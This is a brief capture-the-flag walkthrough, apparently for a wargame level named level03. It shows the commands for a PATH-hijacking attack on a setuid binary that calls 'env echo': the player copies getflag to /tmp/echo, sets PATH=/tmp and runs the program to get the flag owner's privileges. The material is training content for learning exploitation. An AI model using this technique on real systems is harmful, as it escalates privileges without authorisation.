1. `ls -l`
   ```bash
   -rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
   ```

2. `xxd level03 | less`
   ```bash
   [...]
   00005e0: [...] /usr/bin/env echo Exploit me
   [...]
   ```

3. `cp /bin/getflag /tmp/echo`

4. `PATH=/tmp`

5. `./level03`